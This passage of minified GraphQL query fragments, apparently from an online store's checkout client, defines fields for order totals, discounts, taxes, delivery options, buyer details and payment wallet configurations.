__typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone contactInfoV2{...on SMSFormContents{phoneNumber __typename}...on EmailFormContents{email __typename}__typename}customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on AttributionItem{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}simpleDeliveryLine{availableDeliveryStrategies{title amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}deposit __typename}__typename}phone email contactInfoV2{...on EmailFormContents{email __typename}...on SMSFormContents{phoneNumber __typename}__typename}marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on AttributionItem{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}iframe{sources __typename}__typename}apiVersion appId appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on 